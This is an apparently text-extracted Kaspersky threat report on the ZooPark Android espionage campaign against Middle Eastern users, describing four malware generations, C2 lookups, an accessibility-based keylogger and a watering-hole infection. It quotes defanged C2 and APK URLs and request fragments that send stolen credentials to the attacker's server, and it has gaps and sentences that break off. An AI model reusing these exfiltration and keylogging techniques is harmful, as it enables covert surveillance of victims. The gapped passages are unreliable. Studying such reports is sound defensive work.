Who’s who in the Zoo. Cyberespionage operation targets
Android users in the Middle East.

Kaspersky Lab

ZooPark is a cyberespionage operation that has been focusing on Middle Eastern targets
since at least June 2015. The threat actors behind ZooPark infect Android devices using
several generations of malware we label from v1-v4, with v4 being the most recent version
deployed in 2017.
The preferred infection vector for ZooPark is waterhole attacks. We found several news
websites that have been hacked by the attackers to redirect visitors to a downloading site
that serves malicious APKs. Some of the themes observed in campaign include “Kurdistan
referendum”, “TelegramGroups” and “Alnaharegypt news”, among others.
Target profile has evolved during the last years of campaign, focusing on victims in Egypt,
Jordan, Morocco, Lebanon and Iran.

including new features in each iteration. The following chart summarizes the main features
added in new generations:

In this section we will detail the main technical features of the malware used in this
campaign.

Version 1.0 - circa 2015
The first version of the malware that we found (EC5A6F0E743F4B858ABA9DE96A33FB0C)
is pretty simple. The certificate used has been valid since 2015:

Malware certificate

It has only two functions – stealing contacts from the address book and accounts registered
on the victim device. The malware mimics a Telegram application:

After being manually launched, it checks for an internet connection. If unavailable, it only
shows a dialog with an alert in Farsi:
.‫لطفا به اینترنت متصل شده و یکبار دیگر برنامه را اجرا کنید‬
"Please connect to the internet and run the program again.”

When the connection is stable, the malware sends a request to the C2 server, encoding the
stolen data (contacts and accounts) in base64:

Base64Encode(accounts))

This is followed by the content of the website being displayed (not available at the moment):
“hxxp://www.rhubarb2[.]com/telg/index.php?set=show”
within the app. We found that the content is available in the new server used by the
attackers (rhubarb3[.]com):

This is a list of Iranian Telegram channels. Any additional channel can be added to the form above.

Version 2.0 (2016) - lightweight spyware
We found that all samples of this version are signed by the same debug certificate:

For this version, every sample contains a hardcoded configuration that contains its C2
address and variables for use in the request:

This new version is similar to the previous. The main difference is the inclusion of new
spying features such as exfiltrate GPS location, SMS messages, call logs and some extra
general information.

Additionally, there is a strange feature called “pic”.

Pic feature

This reads the content of the file “zoo.zoo” (located on the memory card, in the picture/photo
path), encodes it with Base64 and sends it to the server, removing the original file. This file is
a photo silently captured by the frontal camera, and we believe it was probably created by
some unknown malware component.
One of the samples (6A388EDBCE88BB0331AE875CEEB2F319) mimics the All-in-One
messenger application. After launch, it only presents a credential form if the date on the
device is prior to 2017.01.01 (hardcoded). Otherwise, it just executes System.exit().

Phishing form 6A388EDBCE88BB0331AE875CEEB2F319

Obviously, after clicking the ‘Login’ button, credentials will be sent to the C2 server, in a
similar request to that used in version 1.0:
V1:
hxxp://www.rhubarb2[.]com/get/index[.]php?id=" + Base64Encode("gogo") + "&user=" +
Base64Encode("TelgramGp") + "&pass=" + Base64Encode("TelgramGp") + "&data=" +

V2:

Base64Encode(entered_email) + "&pass=" + Base64Encode(entered_password) +
"&data=" + Base64Encode("[AllInOne]" + accounts)

This seems to confirm that the C2 servers used by both versions have a very similar
backend.

Version 3.0 (2016) - commercial fork
This version of the malware is especially interesting due to the notable similarities to the
commercial spyware product Spymaster Pro. There are several code similarities, with the
main difference being that ZooPark uses its own command and control server:

Spymaster Pro code fragment

ZooPark code fragment

From the screenshots above, Spymaster Pro uses
hxxp://www.spymasterpro[.]com/spyMobile/upload[.]php and ZooPark hxxp://*own C2
server*/ + /spyMobile/upload.php.
In order to get its C2 address, ZooPark v3 sends a request to an intermediate server to
download a file that looks like a normal picture (androidupdaters[.]com/img.jpg):

9

Kaspersky Lab

The file looks like a typical JPG but appends an IP address that will be used for the C2.
There are some details that seem to demonstrate that ZooPark developers did not fully
understand the Spymaster Pro code they were reusing. In the case of the SmsReceiver
function, we can see how in both implementations they use the “PASSWORD” variable:

Spymaster Pro and ZooPark code comparison

The difference is that Spymaster Pro uses this variable for SMS message encryption, while
ZooPark uses an own hardcoded AES key, so the “PASSWORD” variable left in the code
has no purpose.

Even if the Baseurl is the address of the C2 server, this is a legacy variable from version 2.
Actually, the main C2 server address is determined like in version 3, by sending a request to
an intermediate server. All the samples found contain two encrypted intermediate server
addresses:

After decoding IMAGE_ADDRESSES the real request would be:

Then the malware finds out which of the requested images contains a valid IP address for
the main C2 server, like version 3.

google_logo.jpg

The main C2 server has an IP from the same subnet as version 3

The main entry point for this version is triggered by two specific events:

This receiver starts the main malicious service called GooglePlayService, which controls
other components. After launch, it creates all the working directories, inits the database and
checks if the current device is rooted by searching for the following su binaries and
Superuser.apk:

It also registers two additional receivers:

Kaspersky Lab

They are triggered after the device connection changes or the screen turns on/off. In the first
case it starts uploading the stolen data to the C2; in the second it processes preloaded C2
server commands.
This version has a huge internal configuration containing dozens of parameters that regulate
the malicious activities. This configuration can be updated from the C2 server.
Part of the stolen information is stored in an internal SQL database, called testunitdb.
Actually, this version is able to steal additional information compared to version 3:
•
•
•

Browser data: search history;
Clipboard data;
Keylogs;

The keylogger implementation based on the AccessibilityService is something we have
already seen in other spyware families. Basically, it listens for specific events such as
changing the text of any EditText element on the screen (type = 16), opening a
PopupWindow, Menu, Dialog, etc. (for instance, windows that may contain EditText fields
(type = 32)). When the second event is found, the malware initializes the keylogger instance,
logging typed text and the related contextual application name.

This means the Keylogger is able to log any typed credentials for any application with
system forms.

Arbitrary files/folders;
Capturing photos/videos/audio;
Capturing screenshots/screen records;
External applications data – default list: Telegram, WhatsApp, IMO, Chrome (can be
extended in the configuration).

This version also implements some backdoor functionality:
•
•
•

Shell command execution (with or without root);
Silently sending SMSs;
Making calls.

Communications with C2 server
After the malware obtains the main C2 address, it connects to the C2 server on port 6666.
All the transmitted data is encrypted with RSA, with its Java public key file located in
\assets\puki.
It also generates an AES key and sends it to the C2 server for additional responses.
Interestingly, the developers used the “secure random” fix for key generation:

Android users in the Middle East.

Kaspersky Lab

This shows the developers’ concerns about cryptography. Since this attack is very targeted,
we can assume the developers paid special attention to work on outdated devices that are
vulnerable to this “insecure random” attack.
Here is the scheme of client-server communications:

Interestingly, the malware decrypts and saves commands received from its C2 server in files
within its own directory to process them later:

As mentioned in this code snippet, the malware operates with “Pac” serializable objects that
are used as tasks from the server to execute (when the “type” value is even) and as report
containers for C2 submission (when the “type” value is odd). The “Pac” report with the
completed task has a “type” value +1 compared to the related task. All reports are saved in
the “TO_GO” directory.
Here is the full list of possible tasks from the C2 server:

The page had an iframe pointing to a malicious APK:

hxxp://showroommontorgueil[.]com/modules/homepageadvertise2/slides/alnaharegypt.news_v2.0[.]apk

It would start downloading the malicious APK in Android without any notification, though a
modern browser such as Chrome will notify the user before starting the download. The
malicious APK name (alnaharegypt.news_v2.0.apk) mimics the waterholed site.
We took a closer look at the site hosting the malicious APK file showroommontorgueil[.]com. It was the site of a French fashion brand:

Showroommontorgueil.com state on 2016-01-16

Despite the fact the site is currently unavailable, based on the watering hole URL we can tell
that it was a PrestaShop web application. And if we look for serious security vulnerabilities
there is an important one related to file uploading. It allows a remote attacker to upload an

arbitrary file by abusing PrestaShop modules, and as a result take control of the victim’s

Moreover, there is a list of URLs on Pastebin that look like vulnerable or already pawned
PrestaShop sites, and it contains showroommontorgueil.com:

And the last point is the cached deface state of showroommontorgueil.com hacked by

It looks like the main interest of this hacking group is defacing vulnerable websites and they
are probably unrelated to the campaign actors.
All this suggests that showroommontorgueil.com was hacked and probably by multiple
attackers.

Conclusions
From the technical point of view, the evolution of ZooPark has shown notable progress: from
the very basic first and second versions, the commercial spyware fork in its third version and
then to the complex spyware that is version 4. This last step is especially interesting,
showing a big leap from straightforward code functionality to highly sophisticated malware.
This suggests the latest version may have been bought from vendors of specialist
surveillance tools. That wouldn’t be surprising, as the market for these espionage tools is
growing, becoming popular among governments, with several known cases in the Middle
East. Also, choosing mobile platforms for espionage campaigns is just a natural evolutionary
step. At this point, we cannot confirm attribution to any known actor.
